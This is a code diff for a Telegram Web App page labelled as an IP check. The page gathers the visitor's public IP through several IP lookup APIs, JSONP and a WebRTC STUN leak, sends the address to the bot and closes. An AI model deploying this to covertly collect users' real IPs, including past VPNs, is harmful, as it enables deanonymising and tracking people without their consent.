@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка</title>
+    <title>Проверка IP</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding: 20px;">
@@ -11,30 +11,138 @@
     <p id="status">Пожалуйста, подождите...</p>
     
     <script>
-        // Ждём инициализации Telegram WebApp
-        Telegram.WebApp.ready();
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
         
-        // Получаем IP через публичный API
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('status').innerText = 'IP: ' + data.ip;
+        // Метод 1: Fetch с разными API
+        async function methodFetch() {
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://ipinfo.io/json',
+                'https://api.myip.com',
+                'https://ipapi.co/json/',
+                'https://ipwho.is/',
+                'https://api64.ipify.org?format=json'
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const response = await fetch(api);
+                    if (!response.ok) continue;
+                    
+                    const data = await response.json();
+                    const ip = data.ip || data.query;
+                    
+                    if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                        return ip;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            throw new Error('Fetch failed');
+        }
+        
+        // Метод 2: JSONP
+        async function methodJSONP() {
+            return new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                const callbackName = 'ipCallback_' + Date.now();
                 
-                // Отправляем IP в бота
-                Telegram.WebApp.sendData(data.ip);
+                window[callbackName] = function(data) {
+                    const ip = data.ip || data.query;
+                    if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                        resolve(ip);
+                    } else {
+                        reject(new Error('Invalid IP'));
+                    }
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                };
                 
-                // Закрываем
-                setTimeout(() => {
-                    Telegram.WebApp.close();
-                }, 500);
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = 'Ошибка: ' + error;
+                script.src = 'https://api.ipify.org?format=jsonp&callback=' + callbackName;
+                script.onerror = () => {
+                    reject(new Error('JSONP failed'));
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                };
                 
-                // Отправляем ошибку
-                Telegram.WebApp.sendData("error");
-                Telegram.WebApp.close();
+                document.body.appendChild(script);
+                
+                setTimeout(() => reject(new Error('Timeout')), 5000);
             });
+        }
+        
+        // Метод 3: WebRTC
+        async function methodWebRTC() {
+            return new Promise((resolve, reject) => {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
+                
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(reject);
+                
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const candidate = ice.candidate.candidate;
+                        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        
+                        if (ipMatch) {
+                            const ip = ipMatch[0];
+                            // Исключаем локальные IP
+                            if (!ip.startsWith('192.168.') && 
+                                !ip.startsWith('10.') && 
+                                !ip.startsWith('172.') &&
+                                ip !== '0.0.0.0') {
+                                resolve(ip);
+                                pc.close();
+                            }
+                        }
+                    }
+                };
+                
+                setTimeout(() => {
+                    reject(new Error('WebRTC timeout'));
+                    pc.close();
+                }, 5000);
+            });
+        }
+        
+        // Главная функция
+        async function main() {
+            const methods = [methodFetch, methodJSONP, methodWebRTC];
+            
+            for (const method of methods) {
+                try {
+                    const ip = await method();
+                    
+                    if (ip) {
+                        document.getElementById('status').innerHTML = 
+                            '✅ IP: <strong style="color: #4CAF50;">' + ip + '</strong>'
+                        
+                        tg.sendData(ip);
+                        
+                        setTimeout(() => tg.close(), 1000);
+                        return;
+                    }
+                } catch (e) {
+                    console.log('Метод не сработал:', e.message);
+                    continue;
+                }
+            }
+            
+            // Если все методы не сработали
+            document.getElementById('status').innerHTML = 
+                '❌ Не удалось получить IP<br><br>' +
+                '<button onclick="location.reload()" style="padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">🔄 Повторить</button>';
+        }
+        
+        main();
     </script>
 </body>
 </html>
